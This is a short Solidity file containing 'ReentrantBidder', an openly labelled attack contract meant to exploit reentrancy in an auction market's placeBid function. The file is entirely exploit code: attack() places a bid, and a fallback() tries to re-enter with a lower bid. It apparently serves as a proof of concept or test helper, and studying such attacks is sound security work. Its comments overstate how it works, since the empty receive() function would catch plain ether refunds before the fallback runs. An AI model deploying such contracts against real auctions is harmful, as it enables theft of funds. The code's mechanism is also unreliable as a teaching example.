// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

interface IAuctionMarket {
  function placeBid() external payable;
}

contract ReentrantBidder {
  IAuctionMarket public auctionMarket;
  bool private attacked = false;

  // Set the address of the AuctionMarket contract
  constructor(address _auctionMarket) {
    auctionMarket = IAuctionMarket(_auctionMarket);
  }

  // Fallback function to trigger reentrancy
  fallback() external payable {
    if (!attacked) {
      attacked = true;  // Ensure the attack only happens once
      auctionMarket.placeBid{value: 0.1 ether}();  // Attempt reentrant call with lower bid
    }
  }

  // Attack function to initiate the bid and trigger the fallback
  function attack() external payable {
    require(msg.value >= 1 ether, "Insufficient attack value");
    auctionMarket.placeBid{value: msg.value}();  // Initiate the first bid
  }

  // Receive function to accept plain ether transfers
  receive() external payable {}
}
